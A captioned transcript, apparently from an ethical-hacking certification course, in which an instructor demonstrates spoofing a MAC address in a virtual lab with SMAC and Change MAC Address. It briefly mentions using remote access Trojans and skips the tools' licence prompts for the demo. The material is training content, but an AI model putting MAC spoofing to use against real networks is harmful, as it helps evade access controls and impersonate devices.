interesting.\n\n726\n00:35:31.740 --> 00:35:34.050\n&gt;&gt; All right,\nAdam again another fantastic show,\n\n727\n00:35:34.050 --> 00:35:38.200\na lot of great information there when it\ncomes to sniffing as well as the five Is.\n\n728\n00:35:38.200 --> 00:35:40.170\nI can't wait to see\nthe rest of that story.\n\n729\n00:35:40.170 --> 00:35:40.780\n&gt;&gt; Yeah, yeah.\n\n730\n00:35:40.780 --> 00:35:42.100\nReally cool stuff, really cool stuff.\n\n731\n00:35:42.100 --> 00:35:44.640\n&gt;&gt; All right well hope everybody out\nthere enjoyed watching, signing off for\n\n732\n00:35:44.640 --> 00:35:47.220\nIT Pro TV I'm Mike Rodrick.\n\n733\n00:35:47.220 --> 00:35:49.675\n&gt;&gt; I'm not allowed to talk,\nI'm just waving at the camera.\n\n734\n00:35:49.675 --> 00:35:51.230\n&gt;&gt; [LAUGH] We'll see you next time.\n\n735\n00:35:51.230 --> 00:35:53.209\n&gt;&gt; Take care everybody.\n\n736\n00:35:53.209 --> 00:36:01.640\n[SOUND]\n\n",

00:00:17.110\nI'm your host Mike Rodrick and\n\n4\n00:00:17.110 --> 00:00:20.780\ntoday we're doing our certified\nethical hacker version 9.\n\n5\n00:00:20.780 --> 00:00:22.110\nAnd specifically in this episode,\n\n6\n00:00:22.110 --> 00:00:25.150\nwe're actually continuing\na conversation on sniffing.\n\n7\n00:00:25.150 --> 00:00:27.990\nRight, we've talked about the concept\nof sniffing network traffic,\n\n8\n00:00:27.990 --> 00:00:30.790\nwe've broken down what\na packet looks like, and\n\n9\n00:00:30.790 --> 00:00:34.810\nwhat information we might glean out\nof that packet or that raw data.\n\n10\n00:00:34.810 --> 00:00:36.510\nWe've talked about how\nto switch to ethernet,\n\n11\n00:00:36.510 --> 00:00:38.122\nwe might have to change\nit up a little bit.\n\n12\n00:00:38.122 --> 00:00:42.160\nWe talked about promiscuous mode and\nspan ports on switches so\n\n13\n00:00:42.160 --> 00:00:44.380\nwe can see the traffic\nthat we wanted to capture.\n\n14\n00:00:44.380 --> 00:00:47.720\nNow we're gonna take a look at how we\nactually do the capture of the traffic.\n\n15\n00:00:47.720 --> 00:00:50.540\nAnd here to guide us through\nthe process is Mr. Adam Gordon.\n\n16\n00:00:50.540 --> 00:00:51.630\nHow you doing, Adam?\n\n17\n00:00:51.630 --> 00:00:52.731\n&gt;&gt; Very good, very good.\n\n18\n00:00:52.731 --> 00:00:55.880\nThere, I'm looking off to the side\nagain from a set of old conversations\n\n19\n00:00:55.880 --> 00:00:56.890\nfrom yesterday.\n\n20\n00:00:56.890 --> 00:00:58.940\nI am doing well, I'm doing well.\n\n21\n00:00:58.940 --> 00:01:01.240\nHopefully everybody out there is also.\n\n22\n00:01:01.240 --> 00:01:04.380\nSo as Mike was saying,\nwe're gonna jump in in just a minute, but\n\n23\n00:01:04.380 --> 00:01:08.170\nas Mike was saying we're going to\nactually take a little field trip, right.\n\n24\n00:01:08.170 --> 00:01:11.513\nAnd one of my most favorite parts of\nspending time with you guys and doing\n\n25\n00:01:11.513 --> 00:01:15.541\nepisodes, aside from hanging out with Mike\nand all the great people here at ITProTV.\n\n26\n00:01:15.541 --> 00:01:18.641\nIs the ability to be able to actually\ndemo, in theory show you hands on,\n\n27\n00:01:18.641 --> 00:01:21.400\nas Mike was saying,\nhow some of the stuff actually works.\n\n28\n00:01:21.400 --> 00:01:22.683\nIt's great to talk about it in theory,\nright,\n\n29\n00:01:22.683 --> 00:01:25.310\nit's always nice to know, hey,\nyou know you could do this.\n\n30\n00:01:25.310 --> 00:01:28.220\nWe talked yesterday, or\nrather just in our prior episode,\n\n31\n00:01:28.220 --> 00:01:30.900\nabout the fact that we\ncan change a MAC address.\n\n32\n00:01:30.900 --> 00:01:34.640\nSo we said this is what you would do, but\nwe didn't really show you how to do that.\n\n33\n00:01:34.640 --> 00:01:38.900\nAnd I remember when I was starting\nout many, many years ago and\n\n34\n00:01:38.900 --> 00:01:42.240\nI would think Mike probably for you and\nall people that have done this for\n\n35\n00:01:42.240 --> 00:01:44.200\na while probably have similar stories.\n\n36\n00:01:44.200 --> 00:01:47.430\nYou would hear people talk about your\npeers, your colleagues, your mentors,\n\n37\n00:01:47.430 --> 00:01:50.400\npeople you looked up to that\nyou were trying to learn from.\n\n38\n00:01:50.400 --> 00:01:53.110\nYou would hear them talk about\nwhatever the technology or\n\n39\n00:01:53.110 --> 00:01:54.940\nthe issue of the day would've been.\n\n40\n00:01:54.940 --> 00:01:58.110\nI remember being fascinated, I was sitting\ntalking to somebody who was a little bit\n\n41\n00:01:58.110 --> 00:02:02.860\nmore senior than I was at the time, I was\nreally just starting out in my career.\n\n42\n00:02:02.860 --> 00:02:06.360\nAnd he was explaining to me the concept\nof how you could send an email.\n\n43\n00:02:06.360 --> 00:02:10.770\nAnd this is before you had the kind\nof email systems we have today.\n\n44\n00:02:10.770 --> 00:02:14.620\nThere was no web based access for email,\nfor instance, you didn't have active sync,\n\n45\n00:02:14.620 --> 00:02:17.110\nand get email on all your smart devices.\n\n46\n00:02:17.110 --> 00:02:20.832\nThis is back when people still\nchiseled email out on tablets, and\n\n47\n00:02:20.832 --> 00:02:24.500\nactually pterodactyls delivered them,\nand things like that.\n\n48\n00:02:24.500 --> 00:02:29.512\nAnd so back in the early days of email\nsystems, I'm talking over 30 years ago,\n\n49\n00:02:29.512 --> 00:02:32.621\nwhen I was starting out,\nor close to it, anyway.\n\n50\n00:02:32.621 --> 00:02:36.480\nWhen I was starting out you didn't have\na lot of the technology we have today.\n\n51\n00:02:36.480 --> 00:02:40.460\nYou had email of a kind, and you could\nuse send mail like systems to send mail.\n\n52\n00:02:40.460 --> 00:02:43.090\nBut you didn't have Microsoft Outlook,\nfor instance,\n\n53\n00:02:43.090 --> 00:02:44.355\nI mean it just didn't exist as a product.\n\n54\n00:02:44.355 --> 00:02:48.560\nAnd Microsoft as a company was really in\nits infancy, just getting started, and\n\n55\n00:02:48.560 --> 00:02:49.270\nthings like that.\n\n56\n00:02:49.270 --> 00:02:53.160\nAnd I remember he was telling me hey,\nyou can send email from a command line.\n\n57\n00:02:53.160 --> 00:02:56.280\nI didn't know what a command line was\nat the time and that was an epiphany.\n\n58\n00:02:56.280 --> 00:02:59.330\nBut you can send essentially from\na command line and I'm joking,\n\n59\n00:02:59.330 --> 00:03:00.971\nI did know what a command\nline was at the time.\n\n60\n00:03:00.971 --> 00:03:02.549\n&gt;&gt; [LAUGH]\n&gt;&gt; Because there wasn't much else,\n\n61\n00:03:02.549 --> 00:03:04.099\nother than the command line back then.\n\n62\n00:03:04.099 --> 00:03:11.260\nBut he told me, hey you can use the SMTP\nHELO or extended HELO functionality.\n\n63\n00:03:11.260 --> 00:03:15.870\nDepending on what we were talking about,\nHELO, EHLO, from a command line to be able\n\n64\n00:03:15.870 --> 00:03:19.790\nto essentially write mail and\nsend it from this interface.\n\n65\n00:03:19.790 --> 00:03:22.940\nYou didn't need a mail client\nto be able to do that.\n\n66\n00:03:22.940 --> 00:03:26.770\nAnd I remember him showing that to me,\nand saying,okay, so sit down,\n\n67\n00:03:26.770 --> 00:03:28.240\nlet me show you how this works.\n\n68\n00:03:28.240 --> 00:03:32.090\nAnd just being fascinated by the idea of\nnot just being able to understand it.\n\n69\n00:03:32.090 --> 00:03:35.620\nBut actually being shown it, because\nI could conceptualize the idea right?\n\n70\n00:03:35.620 --> 00:03:38.010\nI can understand theoretically okay,\nso you sit down,\n\n71\n00:03:38.010 --> 00:03:41.520\nyou type in, you access it basically\nthrough Telnet at the time,\n\n72\n00:03:41.520 --> 00:03:43.850\nbecause we didn't know\nany better back then.\n\n73\n00:03:43.850 --> 00:03:46.420\nSo you would use Telnet to\nessentially connect and\n\n74\n00:03:46.420 --> 00:03:49.410\nyou would open up an SMTP\nbasde session to a server.\n\n75\n00:03:49.410 --> 00:03:51.700\nAnd you would then be able\nto get these commands, and\n\n76\n00:03:51.700 --> 00:03:56.120\nyou would be able to say recipient to,\nand send to this or whoever.\n\n77\n00:03:56.120 --> 00:04:01.280\nAnd you'll be able to go through and\ntype in send to Mike@itpro.tv, or whoever.\n\n78\n00:04:01.280 --> 00:04:02.900\nYou would then be able to say from, and\n\n79\n00:04:02.900 --> 00:04:06.570\nyou would say from\nAdam@nondisclosed.com or whatever.\n\n80\n00:04:06.570 --> 00:04:09.440\nAnd you would then be able to say\nwhat the body of the message was.\n\n81\n00:04:09.440 --> 00:04:12.340\nAnd you could do all this with\njust a few simple commands.\n\n82\n00:04:12.340 --> 00:04:14.617\nAnd you would hit send, and the mail\nwould be relayed essentially right,\n\n83\n00:04:14.617 --> 00:04:15.530\nand it would go.\n\n84\n00:04:15.530 --> 00:04:19.969\nAnd I remember thinking had I not\nhad the opportunity to sit down and\n\n85\n00:04:19.969 --> 00:04:22.901\nwatch this person do this, ask questions,\n\n86\n00:04:22.901 --> 00:04:28.000\nfigure out what visually was kind of\ngoing on and have a connection to it.\n\n87\n00:04:28.000 --> 00:04:30.445\nIt was gonna be real tough for\nme to internalize this information.\n\n88\n00:04:30.445 --> 00:04:33.445\nI just kept thinking,\nhey I never would have really gotten this,\n\n89\n00:04:33.445 --> 00:04:36.315\nit would have stuck, but it always\nwould have been a question mark for me.\n\n90\n00:04:36.315 --> 00:04:37.115\n&gt;&gt; Right.\n&gt;&gt; And so\n\n91\n00:04:37.115 --> 00:04:40.615\nI love having the opportunity when I\nwork with customers, work with students.\n\n92\n00:04:40.615 --> 00:04:43.947\nAny of you that are listening to\nus either live, and obviously,\n\n93\n00:04:43.947 --> 00:04:47.237\nalways happy to have you listening to\nus when we're doing this for real.\n\n94\n00:04:47.237 --> 00:04:49.577\nOr if you're listening to it\nafter the fact at some point, and\n\n95\n00:04:49.577 --> 00:04:51.427\nhopefully many of you will.\n\n96\n00:04:51.427 --> 00:04:55.963\nAnd you see us do this and hear us talk\nabout it, and maybe even send in comments\n\n97\n00:04:55.963 --> 00:04:59.533\nand questions and follow up with us, which\nis also great when you do that over time.\n\n98\n00:04:59.533 --> 00:05:02.533\nIt's great to be able to be\nable to see somebody do it and\n\n99\n00:05:02.533 --> 00:05:04.493\nbe able to hear the explanation\nat the same time.\n\n100\n00:05:04.493 --> 00:05:07.093\nAnd I find that's just one of\nthe most fascinating things for me.\n\n101\n00:05:07.093 --> 00:05:07.808\nEven today,\n\n102\n00:05:07.808 --> 00:05:12.358\n30 something odd years into my career,\nI still learn by seeing people do things.\n\n103\n00:05:12.358 --> 00:05:13.891\n&gt;&gt; Yes.\n&gt;&gt; And that's how I learn,\n\n104\n00:05:13.891 --> 00:05:15.820\nthat's just how I'm wired.\n\n105\n00:05:15.820 --> 00:05:18.066\nAnd having that opportunity is,\njust for me,\n\n106\n00:05:18.066 --> 00:05:21.300\nbeen very valuable from\na professional development standpoint.\n\n107\n00:05:21.300 --> 00:05:23.570\nSo, hopefully it works the same way for\nyou guys.\n\n108\n00:05:23.570 --> 00:05:26.140\nI know Mike sounds like he\nshares that kind of philosophy.\n\n109\n00:05:26.140 --> 00:05:27.990\nAnd I know when we do this kind of stuff,\n\n110\n00:05:27.990 --> 00:05:32.130\nwe try to go out of our way to spend time\nto really explain but also show you.\n\n111\n00:05:32.130 --> 00:05:34.838\nMike does that great work,\nhe always does for us with his drawings.\n\n112\n00:05:34.838 --> 00:05:36.740\n&gt;&gt; [LAUGH]\n&gt;&gt; And really brings to life so\n\n113\n00:05:36.740 --> 00:05:39.820\nmany of those concepts using\nstick figures, and colors, and-\n\n114\n00:05:39.820 --> 00:05:40.460\n&gt;&gt; Alice and Bob, and-\n\n115\n00:05:40.460 --> 00:05:41.090\n&gt;&gt; Alice and Bob.\n\n116\n00:05:41.090 --> 00:05:41.630\n&gt;&gt; Yeah.\n[LAUGH]\n\n117\n00:05:41.630 --> 00:05:43.362\n&gt;&gt; It's fascinating what Mike can do with,\n\n118\n00:05:43.362 --> 00:05:46.360\nhe's the MacGyver of that drawing tool,\nit's unbelievable.\n\n119\n00:05:46.360 --> 00:05:47.720\nYou should watch him off screen.\n\n120\n00:05:47.720 --> 00:05:51.810\nHe's got a little artist cap on,\nhis smock, and he uses a French accent.\n\n121\n00:05:51.810 --> 00:05:55.790\nIt's really bizarre, but it's, it all\ncomes together well at the end of the day.\n\n122\n00:05:55.790 --> 00:05:59.224\nAll right so enough of that cuz we don't\nwanna hear about Mike's peculiarities,\n\n123\n00:05:59.224 --> 00:06:01.280\nwe wanna actually focus\non the lab environment.\n\n124\n00:06:01.280 --> 00:06:03.211\nSo Mike, you're gonna help me talk\nthrough some of this as we go.\n\n125\n00:06:03.211 --> 00:06:03.825\n&gt;&gt; Okay.\n\n126\n00:06:03.825 --> 00:06:06.070\n&gt;&gt; While we're gonna go\nto the lab environment.\n\n127\n00:06:06.070 --> 00:06:08.745\nWe're gonna take a look and we're gonna\ntalk about some different things.\n\n128\n00:06:08.745 --> 00:06:11.650\nAnd we're gonna actually first\ntalk a little bit about how we\n\n129\n00:06:11.650 --> 00:06:12.810\ncan change MAC addresses.\n\n130\n00:06:12.810 --> 00:06:16.700\nRight, we spoke about this, and\nI spoke yesterday about the fact.\n\n131\n00:06:16.700 --> 00:06:18.233\nThere's a couple different\nways we could do it.\n\n132\n00:06:18.233 --> 00:06:21.903\nI mentioned we could edit the registry\nin a older machine like Win 7,\n\n133\n00:06:21.903 --> 00:06:23.115\nsomething like that.\n\n134\n00:06:23.115 --> 00:06:24.980\nWe could it in new machines, as well.\n\n135\n00:06:24.980 --> 00:06:27.000\nI mentioned that in Windows 8.1 and\nWindows 10,\n\n136\n00:06:27.000 --> 00:06:30.890\nwe actually have an interface on the\nnetwork card where we can actually go in\n\n137\n00:06:30.890 --> 00:06:35.320\nunder advanced settings and program in\na MAC address, a secondary MAC address.\n\n138\n00:06:35.320 --> 00:06:39.300\nSo we could do that way, that's kind of a\nnew thing, hasn't been there all the time.\n\n139\n00:06:39.300 --> 00:06:42.590\nBut I also mentioned there were some\ntools, right, that we could use.\n\n140\n00:06:42.590 --> 00:06:46.450\nAnd depending on the kind of tool we\nwanted to use we would have a graphical\n\n141\n00:06:46.450 --> 00:06:49.810\ninterface essentially,\nto go in and change MAC addresses.\n\n142\n00:06:49.810 --> 00:06:54.050\nI've loaded up a couple of those\ntools on the desktop, I'll just drag\n\n143\n00:06:54.050 --> 00:06:59.150\nthe two icons over here kind of side\nby side so we can take a look at them.\n\n144\n00:06:59.150 --> 00:07:01.405\nNo I don't want to pin\nthat to the Start menu.\n\n145\n00:07:01.405 --> 00:07:03.540\n&gt;&gt; [LAUGH]\n&gt;&gt; Okay, well we'll call that good enough.\n\n146\n00:07:03.540 --> 00:07:07.180\nAnd so we have Change MAC Address and\nwe have SMAC.\n\n147\n00:07:07.180 --> 00:07:10.948\nI think I mentioned SMAC specifically\nas one of the oldies but goodies.\n\n148\n00:07:10.948 --> 00:07:15.306\nIt’s kind of interesting cuz years ago,\nyou may remember this Mike.\n\n149\n00:07:15.306 --> 00:07:18.442\nDepending on how far back you\nkinda go doing this stuff, and\n\n150\n00:07:18.442 --> 00:07:20.960\nsome of you out there may\nremember this as well.\n\n151\n00:07:20.960 --> 00:07:24.106\nBut years ago, when you used to\nget software on floppy discs,\n\n152\n00:07:24.106 --> 00:07:25.266\nfirst of all, right.\n\n153\n00:07:25.266 --> 00:07:28.060\nSo a lot of the driver software we\nwould get would be installed and\n\n154\n00:07:28.060 --> 00:07:29.418\nyou would have it on floppies.\n\n155\n00:07:29.418 --> 00:07:32.487\nAnd you would go to\nconfigure network card, so\n\n156\n00:07:32.487 --> 00:07:36.600\nI'm talking back,\nlet's say around 1995, 1997.\n\n157\n00:07:36.600 --> 00:07:38.490\nSomewhere in there, maybe even up to 2000.\n\n158\n00:07:38.490 --> 00:07:42.670\nYou would configure a network card, but\nyou would have the floppy drivers, or\n\n159\n00:07:42.670 --> 00:07:45.600\nrather the drivers on a floppy disk,\nright, cuz that's how you would do it.\n\n160\n00:07:45.600 --> 00:07:49.300\nAnd so one of the utilities we often\nwould get when we were going to do that,\n\n161\n00:07:49.300 --> 00:07:51.530\nwould be a MAC change utility.\n\n162\n00:07:51.530 --> 00:07:53.724\nIt wasn't necessarily SMAC,\nthere were many of them,\n\n163\n00:07:53.724 --> 00:07:56.911\nall the different network card vendors\nwould kind of have their own take on this.\n\n164\n00:07:56.911 --> 00:08:00.648\nBut you got sweeter set of tools or\nutilities along with the network card, and\n\n165\n00:08:00.648 --> 00:08:04.386\none of them typically is the way you can\nprogram in certain functionalities on\n\n166\n00:08:04.386 --> 00:08:05.250\nthe card.\n\n167\n00:08:05.250 --> 00:08:08.800\nA lot of these were command line tools\ncuz again things were a lot different\n\n168\n00:08:08.800 --> 00:08:09.382\nback then.\n\n169\n00:08:09.382 --> 00:08:12.747\nBut they actually would ship tools\nin this driver set tool kit that\n\n170\n00:08:12.747 --> 00:08:14.641\nlet you manipulate the mac address,\n\n171\n00:08:14.641 --> 00:08:18.206\nso you could actually go and\ndo this in Windows 95 and Windows 98.\n\n172\n00:08:18.206 --> 00:08:19.596\nRemember when this millennium?\n\n173\n00:08:19.596 --> 00:08:20.261\n&gt;&gt; I do.\n\n174\n00:08:20.261 --> 00:08:20.781\n&gt;&gt; God help us.\n\n175\n00:08:20.781 --> 00:08:22.247\n&gt;&gt; [LAUGH]\n&gt;&gt; It's what happens when\n\n176\n00:08:22.247 --> 00:08:25.857\na software company puts out a product\nwith no clear understanding or plan, and\n\n177\n00:08:25.857 --> 00:08:29.420\nthey just repackage something saying\nit's a gaming platform, right?\n\n178\n00:08:29.420 --> 00:08:30.881\nThat's what you get with\nWindows Millennium.\n\n179\n00:08:30.881 --> 00:08:32.087\n&gt;&gt; [LAUGH]\n&gt;&gt; That awesome OS.\n\n180\n00:08:32.087 --> 00:08:33.787\nBut we're not here to talk about that.\n\n181\n00:08:33.787 --> 00:08:35.280\nLet's go back to the screen.\n\n182\n00:08:35.280 --> 00:08:36.340\nAnd take a look.\n\n183\n00:08:36.340 --> 00:08:39.841\nJust remembering back to the fact that\nthese tools were not actually so foreign\n\n184\n00:08:39.841 --> 00:08:43.515\nto us, because at one point we actually\ngot them directly from the manufacturer.\n\n185\n00:08:43.515 --> 00:08:45.710\nAnd you have the right\nto do this essentially.\n\n186\n00:08:45.710 --> 00:08:46.790\nToday it's a little bit different.\n\n187\n00:08:46.790 --> 00:08:48.370\nWe don't ship those kind of utilities.\n\n188\n00:08:48.370 --> 00:08:51.862\nThey certainly do exist out there, but\nwe've made it a lot harder to be able to\n\n189\n00:08:51.862 --> 00:08:54.139\ndo this, right, for\nobvious security reasons.\n\n190\n00:08:54.139 --> 00:08:56.859\n&gt;&gt; Yeah, you know it's interesting\nI remember back when I first\n\n191\n00:08:56.859 --> 00:08:59.329\nstarted taking A+,\none of the things in network plus.\n\n192\n00:08:59.329 --> 00:09:02.865\nOne of the things we learned is that you\ndon't, you can't change the mac drive,\n\n193\n00:09:02.865 --> 00:09:04.490\nburned into cards, it's a unique.\n\n194\n00:09:04.490 --> 00:09:06.352\n&gt;&gt; That's a lie [LAUGH].\n\n195\n00:09:06.352 --> 00:09:08.390\n&gt;&gt; Globally unique identifier right.\n\n196\n00:09:08.390 --> 00:09:11.541\nYou don't ever change that mac address,\nyou're stuck with it and\n\n197\n00:09:11.541 --> 00:09:14.364\nthen later on you realize well\nyeah that's a complete lie.\n\n198\n00:09:14.364 --> 00:09:17.847\nYou know the operating system has to\nread that information from the card and\n\n199\n00:09:17.847 --> 00:09:20.996\nin store it in the registry and\nthat's where other applications and\n\n200\n00:09:20.996 --> 00:09:23.230\neverything else can get\nthat Mac address from.\n\n201\n00:09:23.230 --> 00:09:26.380\nSo if we can, just go into the registry,\nwe can change the mac address.\n\n202\n00:09:26.380 --> 00:09:28.598\nNow if you reboot the system-\n&gt;&gt; [CROSSTALK] It does wipe it out.\n\n203\n00:09:28.598 --> 00:09:31.555\n&gt;&gt; It goes, does go back so\nyou'd have to change it again, but\n\n204\n00:09:31.555 --> 00:09:35.420\nit's not quite as permanent as we were\nled to believe back in the newbie days.\n\n205\n00:09:35.420 --> 00:09:39.560\n&gt;&gt; Nothing is permanent except for\nmy smile when I'm talking to you, and\n\n206\n00:09:39.560 --> 00:09:43.647\nof course death and taxes, but\nthat's a whole other conversation.\n\n207\n00:09:43.647 --> 00:09:47.435\nAll right, so\nlet's take a look at one of the tools.\n\n208\n00:09:47.435 --> 00:09:49.745\nThis is the Change Mac Address tool.\n\n209\n00:09:49.745 --> 00:09:52.625\nAgain, you can download these tools,\nyou'll find them on the Internet.\n\n210\n00:09:52.625 --> 00:09:56.261\nWe'll see if we can at least give you\nsome of the URLs for some of the tools,\n\n211\n00:09:56.261 --> 00:09:57.385\nmaybe not all of them.\n\n212\n00:09:57.385 --> 00:10:01.375\nBut Mike will do his best, as he always\ndoes, to ferret those out for you.\n\n213\n00:10:01.375 --> 00:10:05.245\nAnd SMAC, certainly you can find, that's\njust a matter of going out, and I think\n\n214\n00:10:05.245 --> 00:10:09.520\nit's probably on CNET or Tucows, or all\nthese different places you'll find that.\n\n215\n00:10:09.520 --> 00:10:12.280\nSo change MAC address just one\nof the many tools we can use.\n\n216\n00:10:12.280 --> 00:10:15.580\nWe can go in with this tool we've\njust installed ahead of time.\n\n217\n00:10:15.580 --> 00:10:16.330\nSet it up for you.\n\n218\n00:10:16.330 --> 00:10:18.470\nPretty easy interface to look at.\n\n219\n00:10:18.470 --> 00:10:22.040\nLittle nav bar,\nmenu task list on the left here.\n\n220\n00:10:22.040 --> 00:10:25.340\nCorresponding icons up on\nthe menu bar right here,\n\n221\n00:10:25.340 --> 00:10:28.645\nwe're gonna click Change MAC address,\nand we're gonna get a little hey\n\n222\n00:10:28.645 --> 00:10:33.130\nenter registration code, or go ahead and\nbuy, cuz this is just an eval product.\n\n223\n00:10:33.130 --> 00:10:35.050\nWe're just gonna ignore that and continue.\n\n224\n00:10:35.050 --> 00:10:36.170\nObviously in the real world,\n\n225\n00:10:36.170 --> 00:10:38.880\nyou would wanna license any products\nthat require licensing, right?\n\n226\n00:10:38.880 --> 00:10:42.790\nVery important to make sure you know\nthat's always acceptable in appropriate\n\n227\n00:10:42.790 --> 00:10:45.590\nbehavior, but for\npurposes of demonstration here,\n\n228\n00:10:45.590 --> 00:10:50.190\nwe'll simply just gonna go ahead and use\nthe software in a demo mode if you will.\n\n229\n00:10:50.190 --> 00:10:53.750\nAnd you'll see on the screen in front of\nus here, seeing that, how is it good.\n\n230\n00:10:53.750 --> 00:10:56.800\nSo, you'll see that we have the MAC\naddress and we can then enter,\n\n231\n00:10:56.800 --> 00:10:59.860\nessentially enter our own MAC address,\nwe've got\n\n232\n00:10:59.860 --> 00:11:04.220\nlittle boxes there with the various\nareas of the MAC address specified.\n\n233\n00:11:04.220 --> 00:11:07.800\nAnd we can specify what\nnetwork card we wanna target.\n\n234\n00:11:09.160 --> 00:11:12.910\nYou'll see here, we can pull down, and\nwe have the ability, we have a list,\n\n235\n00:11:12.910 --> 00:11:15.072\nessentially, of any kind of network card.\n\n236\n00:11:15.072 --> 00:11:16.935\nWe would choose the appropriate one.\n\n237\n00:11:16.935 --> 00:11:19.021\nThese are not all installed on the system,\nobviously.\n\n238\n00:11:19.021 --> 00:11:21.415\nThere's a very long pick list there,\nright?\n\n239\n00:11:21.415 --> 00:11:24.005\nBe one hell of a system if we had\nall those network interfaces.\n\n240\n00:11:24.005 --> 00:11:27.365\nBut we have a complete listing,\ntheoretically, of course,\n\n241\n00:11:27.365 --> 00:11:32.160\nof most of the major manufacturers and,\nsystem driver manufacturers that\n\n242\n00:11:32.160 --> 00:11:35.700\nwould provide network connectivity,\nwe would choose the appropriate one.\n\n243\n00:11:35.700 --> 00:11:41.141\nThis one is VM ware driver, so it's got\nthe initial VM ware ID for first three,\n\n244\n00:11:41.141 --> 00:11:46.019\nset areas for sort of character\nsets of the mac address 005056.\n\n245\n00:11:46.019 --> 00:11:50.610\nAnd then we would go ahead and modify the\nother ones, and then once we've done that,\n\n246\n00:11:50.610 --> 00:11:54.310\nwe would be able to hit okay and\nactually program in the Mac address.\n\n247\n00:11:54.310 --> 00:11:56.910\nSo it really does not take more than that.\n\n248\n00:11:56.910 --> 00:11:59.680\nWe can see the current mac address\nis listed there by the way.\n\n249\n00:11:59.680 --> 00:12:01.580\nWe could see what the network adapter is,\n\n250\n00:12:01.580 --> 00:12:04.250\nit tells us what\nthe current mac address is.\n\n251\n00:12:04.250 --> 00:12:06.012\nSo we know it's listed there in blue.\n\n252\n00:12:06.012 --> 00:12:08.010\nI'm just kinda hovering over it.\n\n253\n00:12:08.010 --> 00:12:10.820\nAnd it gives us the IP information,\nyou're hey,\n\n254\n00:12:10.820 --> 00:12:14.450\nalready DHCP enabled, or are you\nautoconfig, you know that kind of thing.\n\n255\n00:12:14.450 --> 00:12:15.770\nSo a tool like this,\n\n256\n00:12:15.770 --> 00:12:19.050\nreally nothing more involved than that\nwould be pretty straight forward.\n\n257\n00:12:19.050 --> 00:12:22.080\nWe can use SMAC, just another tool again.\n\n258\n00:12:22.080 --> 00:12:24.400\nYou usually have to register that so\nwe're just gonna go ahead and\n\n259\n00:12:24.400 --> 00:12:26.390\nproceed past the registration.\n\n260\n00:12:26.390 --> 00:12:29.160\nAnd then we have SMAC, this is SMAC 2.0.\n\n261\n00:12:29.160 --> 00:12:33.310\nThere may be a slightly newer version but\nI think it's the most recent one.\n\n262\n00:12:33.310 --> 00:12:35.678\nAnd so, this one's been around forever.\n\n263\n00:12:35.678 --> 00:12:39.860\nI mean, SMAC's probably one of the oldest\ntools I can remember that does this or\n\n264\n00:12:39.860 --> 00:12:43.030\ndoes have the capability\nof being able to do this.\n\n265\n00:12:43.030 --> 00:12:44.910\nAnd so, it's gonna behave the same way.\n\n266\n00:12:44.910 --> 00:12:47.068\nWe're gonna be able to go in.\n\n267\n00:12:47.068 --> 00:12:50.370\nAs you can see we'll highlight\nthe interface there.\n\n268\n00:12:50.370 --> 00:12:54.460\nSo we have two network adapter interfaces,\nthat are listed on this particular machine\n\n269\n00:12:54.460 --> 00:12:56.710\nwe'll obviously choose\nthe appropriate one.\n\n270\n00:12:56.710 --> 00:12:58.636\nAnd, so we're gonna select,\n\n271\n00:12:58.636 --> 00:13:03.810\nwe have the Intel Pro 1000 network\nconnection and network connection two.\n\n272\n00:13:03.810 --> 00:13:07.039\nThe trick here is to look at the MAC\nrather than the IP addresses off in\n\n273\n00:13:07.039 --> 00:13:09.644\nthe corner and I know,\nit's a little bit hard to see and\n\n274\n00:13:09.644 --> 00:13:13.461\nI apologize I can't make this one any\nbigger, cause this one doesn't expand.\n\n275\n00:13:13.461 --> 00:13:15.962\nBut I have a based address on one.\n\n276\n00:13:15.962 --> 00:13:18.890\nNetwork adapter and then I actually\nhave the IP address on the other.\n\n277\n00:13:18.890 --> 00:13:22.290\nSo I'm gonna select the bottom one\nthe one that has the active IP.\n\n278\n00:13:22.290 --> 00:13:26.613\nJust to reference that again we currently\nsee or we do see the current Mac address.\n\n279\n00:13:26.613 --> 00:13:30.108\nSo we the 005056 designation for\nthe VMWare adaptor\n\n280\n00:13:30.108 --> 00:13:34.612\nbecause we're using virtualized\nenvironments as I'm sure you can tell.\n\n281\n00:13:34.612 --> 00:13:37.690\nAnd we'll then be able to put\nin the new spoofed Mac address.\n\n282\n00:13:37.690 --> 00:13:41.006\nWe click down here and\nwe actually can provide a Mac address,\n\n283\n00:13:41.006 --> 00:13:44.204\nagain we would decide whatever\nMac address we want to use.\n\n284\n00:13:44.204 --> 00:13:48.523\nWe can restart the adapter,\ndo an IP config, get a Mac list,\n\n285\n00:13:48.523 --> 00:13:52.083\nyou know,\nrandomly generate the adaptor MAC, so\n\n286\n00:13:52.083 --> 00:13:57.740\nwe have all that kinda stuff that we\ncan do if we choose to, it's up to us.\n\n287\n00:13:57.740 --> 00:14:02.000\nAnd then we can go ahead and specify, or\nwe'll see what the spoof MAC address is,\n\n288\n00:14:02.000 --> 00:14:03.210\nsee the active here.\n\n289\n00:14:03.210 --> 00:14:04.816\nAnd we can actually program and\n\n290\n00:14:04.816 --> 00:14:07.672\nreprogram the MAC in real\ntime using this technology.\n\n291\n00:14:07.672 --> 00:14:08.720\n&gt;&gt; Mm-hm.\n\n292\n00:14:08.720 --> 00:14:13.090\n&gt;&gt; These tools assume that we are given\nphysical proximity access, right?\n\n293\n00:14:13.090 --> 00:14:14.670\nIn other words, we're on the box.\n\n294\n00:14:14.670 --> 00:14:17.030\nWe're able to manipulate it in real time.\n\n295\n00:14:17.030 --> 00:14:22.213\nIf we want to get this MAC address changed\nremotely, we're gonna have to hack in and\n\n296\n00:14:22.213 --> 00:14:25.557\nprobably modify the registry,\nor hack in remotely.\n\n297\n00:14:25.557 --> 00:14:28.786\nSo using some sort of remote\naccess Trojan or back door tool.\n\n298\n00:14:28.786 --> 00:14:29.920\nAnd then from there,\n\n299\n00:14:29.920 --> 00:14:33.730\nlaunch some sort of session that\ngives us desktop access, right?\n\n300\n00:14:33.730 --> 00:14:38.085\nSo we want to keep in mind, this is not\na tool that will target a remote machine\n\n301\n00:14:38.085 --> 00:14:40.554\nacross the wire changing the Mac address.\n\n302\n00:14:40.554 --> 00:14:43.994\nIt's not a standoff tool as we\nwould often talk about, but\n\n303\n00:14:43.994 --> 00:14:48.010\na tool that you have to be engaged\nfully in the system in order to use.\n\n304\n00:14:48.010 --> 00:14:51.400\nSo we do have ways to\nmodify Mac addresses.\n\n305\n00:14:51.400 --> 00:14:56.202\nAnd sniffing, a large portion of what we\ndo with sniffing is about figuring out\n\n306\n00:14:56.202 --> 00:14:57.962\nhow to access information.\n\n307\n00:14:57.962 --> 00:15:00.435\nWe wanna obviously get on the 